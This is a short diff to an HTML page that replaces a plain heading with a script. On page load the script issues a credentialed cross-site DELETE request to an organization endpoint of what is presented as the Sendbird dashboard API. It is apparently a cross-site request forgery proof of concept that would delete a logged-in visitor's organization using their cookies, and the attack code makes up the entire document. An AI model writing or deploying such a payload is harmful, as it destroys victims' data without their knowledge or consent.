@@ -1,6 +1,17 @@
 <!DOCTYPE html>
 <html>
   <body>
-<h1>ahmed</h1>
+    <script>
+      fetch("https://gate.sendbird.com/dashboard_api/organizations/ccc3a149b8ba6ec3c8972a08157a42a478467fdd/", {
+        method: "DELETE",
+        credentials: "include", // send cookies
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          name: "test orggfdd" // mimic original request body
+        })
+      });
+    </script>
   </body>
 </html>
